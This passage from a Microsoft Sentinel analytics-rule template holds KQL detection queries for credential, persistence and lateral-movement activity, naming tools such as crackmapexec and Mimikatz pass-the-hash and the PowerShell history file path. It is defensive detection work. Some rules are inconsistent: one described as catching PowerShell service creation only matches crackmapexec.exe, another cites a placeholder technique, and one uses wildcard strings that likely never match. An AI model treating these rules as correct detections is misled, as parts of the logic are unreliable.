              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-234: [{{Class}}] Windows - Network Sniffing Applications Detected",
            "alertDescriptionFormat": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network.\n\nThis rule identifies usage of common processes associated with network sniffing applications.\n{{ExtendedDescription}}\nInclusion:\nExclusion: AccountName, Computer\n\nRecommendations:\n  1. Review additional activity on Host\n  2. Review additional activity for Account\n  3. Validate user is supposed to use network sniffing applications\n\nMITRE: T1040 Category: Windows Security {{Tags}}"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-474')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-474')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-474: [Hygiene] Windows - Logins from Generic Named Accounts",
          "description": "This alert identifies logins using generic privileged accounts such as administrator, sa, etc. MITRE: T1098 Category: Windows Security Events tag: Hygiene",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4624']);    \nlet ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin = 1d;\nbv_parser_security_event\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where EventID in (EventIDList)\n| where AccountType =~ 'User'\n| where TargetUserName in~ (GENERIC_ADMINS)\n| extend TargetUserName = tolower(TargetUserName)\n| summarize\n    Count=count(),\n    Computers=make_set(Computer, 5),\n    ComputerCount=dcount(Computer),\n    TimeGenerated=min(TimeGenerated)\n    by TargetUserName, bin(TimeGenerated, alert_bin)\n| extend SystemAlertPlatform = 'Correlation'\n| project TimeGenerated,TargetUserName,Count,Computers,ComputerCount,SystemAlertPlatform",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "TimeGenerated": "TimeGenerated",
            "SystemAlertPlatform": "SystemAlertPlatform"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-551')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-551')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-551: [SOC] Windows - New service created using Powershell",
          "description": "This alert triggers when a new service is created using Powershell. PowerShell creates a new service via command line. This can be used by attackers to be persistent on a machine. MITRE: T1543 Category: Windows Security Events tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);     \nbv_parser_security_event \n| where TimeGenerated >= ago(24h) \n| where EventID in (EventIDList)\n| where NewProcessName  endswith 'crackmapexec.exe'\n| project TimeGenerated, Computer, AccountName, CommandLine\n| extend AccountCustomEntity = AccountName\n| extend HostCustomEntity = Computer\n| extend bv_mapping_tag = AccountName",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1543"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-300')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-300')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-300: [RBA] Windows - Console History",
          "description": "This alert checks for execution of MITRE ATT&CK technique https://attack.mitre.org/techniques/T0000. MITRE: T1115,T1005 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);\nbv_parser_security_event\n| where TimeGenerated >= ago(1d)\n| where EventID in (EventIDList)\n| where (CommandLine contains 'Get-History'\nor CommandLine contains 'AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt'\nor CommandLine contains '(Get-PSReadlineOption).HistorySavePath')\n| project TimeGenerated, Computer, Account, NewProcessName , CommandLine \n| extend AccountCustomEntity = Account \n| extend HostCustomEntity = Computer",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1115",
            "T1005"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-202')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-202')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-202: [Custom] Windows Security - Silent log sources 1 hour",
          "description": "This alert is triggered when Sentinel can no long detect Security Event log entries from a Windows log source (in the last 1 hour). MITRE: T1070,T1562 Category: Windows Security Events tag: Health tag: Custom",
          "severity": "Informational",
          "enabled": true,
          "query": "let timeRange = ago(1d);\nbv_parser_security_event\n| where Computer !in (EXCLUDE_FROM_SILENT_ALERTS)\n| where tolower(Computer) matches regex tolower(A202_EXCLUDED_HOSTS) == false\n| where TimeGenerated > timeRange\n| make-series eventsCount = count() on TimeGenerated from timeRange to now() step 1h by Computer\n| extend series_stats(eventsCount)\n| mv-expand eventsCount to typeof(int), TimeGenerated to typeof(datetime)\n| where eventsCount == 0 and series_stats_eventsCount_avg > 1\n| where TimeGenerated >= ago(1h)\n| project HostCustomEntity = Computer, AverageNumberOfEventsPerHour = round(series_stats_eventsCount_avg,0), CurrentNumberOfEvents = eventsCount",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070",
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-515')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-515')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-515: [SOC] Windows Command - Python Script Connecting to Network",
          "description": "This alert identifies the use of python scripts to open a network connection MITRE: T1059,T0853,T1037 Category: Windows Security CommandLine Audited tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();     \nbv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where NewProcessName contains 'python' and (CommandLine contains '*socket*connect*sock_stream*' or CommandLine contains '*socket*sock_stream*connect*')\n| project TimeGenerated,Computer, HostCustomEntity = Computer, Account, NewProcessName , CommandLine \n| extend AccountCustomEntity = Account\n|summarize arg_max(TimeGenerated, *) by Computer, HostCustomEntity\n|extend ExtendedDescription = strcat('Computer ', Computer, ' executed command ', CommandLine)\n| extend VictimEntity = pack_array(Account, Computer)\n|project TimeGenerated, HostCustomEntity, Computer, Account, NewProcessName, CommandLine, AccountCustomEntity, VictimEntity, ExtendedDescription\n| extend bv_mapping_tag = Account",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence"
          ],
          "techniques": [
            "T1059",
            "T0853",
            "T1037"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert triggers when a Windows system executes a Python script that creates a network connection.\n{{ExtendedDescription}}\ntag: SOC\nCategory: Windows Security CommandLine Audited\nMITRE: T1059, T0853, T1037"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-580')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-580')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-580: [RBA] Windows - User Account Created",
          "description": "This alert notifies when an Windows AD account has been created MITRE: T1136,T1078 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 10m;\nlet alert_bin = 10m;\nlet end_time = now();\nlet EventIDList = dynamic(['4720']);\nlet global_config = dynamic({\n    'RBASCORE':0,\n    'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV580_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV580_CONFIG['RBASCORE']),real(0.0));\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | extend bv_rule_version = '1.0.5166'\n| extend bv_rule_timestamp = '1712866315.2314367'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5166 bv_rule_timestamp: 1712866315.2314367'\n| project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | extend bv_rule_version = '1.0.5166'\n| extend bv_rule_timestamp = '1712866315.2314367'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5166 bv_rule_timestamp: 1712866315.2314367'\n| project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k]))\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n};\nbv_parser_security_event\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend bv_rule_version = '1.0.5166'\n| extend bv_rule_timestamp = '1712866315.2314367'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5166 bv_rule_timestamp: 1712866315.2314367'\n| project \n    bv_user = TargetUserName\n    , bv_user_id = TargetUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_object = TargetUserName\n    , bv_object_id = TargetUserSid\n    , bv_object_category = 'user'\n    , bv_change_action = 'create'\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'bv_parser_security_event'\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-580')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_object)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| extend bv_rule_version = '1.0.5166'\n| extend bv_rule_timestamp = '1712866315.2314367'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5166 bv_rule_timestamp: 1712866315.2314367'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT20M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "InitialAccess",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1136",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-580: [RBA] Windows - {{bv_src_user}} created {{bv_object}} account",
            "alertDescriptionFormat": "This alert notifies when an Windows AD account has been created\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1136 MITRE: T1078\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-586')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-586')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-586: [RBA] Windows - Computer Account Deleted",
          "description": "This alert displays the event of a computer account being deleted. MITRE: T1531,T1578 Category: Windows Security Events tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4743']);     \nbv_parser_security_event\n| where TimeGenerated > ago(1h)\n| where EventID in (EventIDList)\n| project TimeGenerated, Activity, HostCustomEntity=Computer, AdminAccount=SubjectAccount, AccountCustomEntity=TargetAccount, SubjectLogonId, EventData",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1531",
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-169')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-169')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-169: [RBA] Windows Command - Suspicious RDP connections",
          "description": "This alert identifies the execution of RDP client from parent processes other than explorer.exe. This may indicate a malicious process attempting connections to remote servers. MITRE: T1021,T1078 Category: Windows Security CommandLine Audited tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let ingested_lookback = 1d;\nlet generated_lookback = 2d;\nbv_parser_security_event \n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback) and TimeGenerated < now()\n| where CommandLine contains 'mstsc.exe' \n| where Computer !in (RDP_JUMPSERVERS)\n| where tolower(Computer) matches regex tolower(A169_RDP_JUMPSERVERS_IN_REGEX) == false\n| where tolower(Account) matches regex tolower(A169_EXCLUSION_ACCOUNT) == false \n| where ParentProcessName !endswith '\\\\explorer.exe'\n| project TimeGenerated , HostCustomEntity = Computer, ParentProcessName, NewProcessName, CommandLine, AccountCustomEntity = Account\n| summarize Events = make_set(pack_all()), CountOfEvents = count() by HostCustomEntity, AccountCustomEntity, bin(TimeGenerated, 1d)\n| extend Comment = 'Investigate the source host - is it an approved RDP jumpserver?'",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement",
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1021",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-148')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-148')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-148: [SOC] Windows - Successful Overpass the Hash Attempt",
          "description": "Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz''s sekurlsa::pth module. \n  This will create a single incident per 24 hour period per account though it will run hourly for new hits. MITRE: T1550 Category: Windows Security Events tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nlet alert_bin = 1h;\nlet EventIDList = dynamic(['4624']);\nlet ingested_lookback = 15m; // earliest [ingest time] boundary\nlet generated_lookback = 1h; // earliest [log time] boundary\nlet alert_nummber = 'BV-148';\nlet PreviousHostNameAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(A148_SUPPRESSION_THRESHOLD) .. now())\n| where AlertName has alert_nummber\n| mv-expand parse_json(Entities)\n| extend HostName = iff(Entities.Type =~ 'host', Entities.Address, '')\n| summarize make_set_if(HostName, isnotempty(HostName)));\nlet PreviousAccountAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(A148_SUPPRESSION_THRESHOLD) .. now())\n| where AlertName has alert_nummber\n| mv-expand parse_json(Entities)\n| extend AccountName = iff(Entities.Type =~ 'account', Entities.Address, '')\n| summarize make_set_if(AccountName, isnotempty(AccountName)));\nbv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time)..end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Computer in~ (PreviousHostNameAlerts) or TargetOutboundUserName in~ (PreviousAccountAlerts)\n| where LogonType == '9'\n| where LogonProcessName =~ 'seclogo'\n| where AuthenticationPackageName =~ 'Negotiate'\n| extend ExcludedHost = tolower(Computer) matches regex tolower(A148_WHITELISTED_COMPUTERS)\n| extend ExcludedTargetHost = tolower(TargetOutboundUserName) matches regex tolower(A148_EXCLUDED_TARGET_USERNAME_REGEX)\n| extend Class = iff(ExcludedHost or ExcludedTargetHost, 'RBA', 'SOC')\n| project TimeGenerated\n      , TargetUserName\n      , TargetDomainName\n      , TargetOutboundUserName\n      , LogonProcessName\n      , LogonTypeName\n      , Computer\n      , Class\n| summarize \n      event_count=count()\n      , bv_start_time = min(TimeGenerated)\n      , bv_end_time = max(TimeGenerated)\n      , bv_src_dvc_cnt=dcount(Computer)\n      , bv_src_dvc=make_set(Computer)\n      , bv_src_user=make_set(TargetOutboundUserName)\n      , Class=make_set(Class) \n    by \n    bv_dest_domain = TargetDomainName\n    , bv_dest_user = TargetUserName\n    , bv_process_name = LogonProcessName\n    , bin(TimeGenerated, alert_bin)\n| extend Class = iff(Class has 'SOC', 'SOC', 'RBA')\n| where Class == 'SOC'\n| extend Tags = iff(Class=~'SOC', 'tag: SOC', 'tag: RBA')\n| extend bv_src_user_1 = bv_src_user[0]\n| extend bv_src_dvc_1 = bv_src_dvc[0]\n| extend VictimEntity = bv_src_dvc\n| extend AttackerEntity = bv_src_user\n| extend ExtendedDescription = strcat(\n      'bv_dest_user: ', bv_dest_user\n      , '\\nbv_process_name: ', bv_process_name\n      , '\\nbv_attacker_entity: \\n* ', strcat_array(bv_src_user, '\\n* ')\n      , '  \\n\\nbv_src_dvc: \\n* ', strcat_array(bv_src_dvc, '\\n* ')\n)\n| project 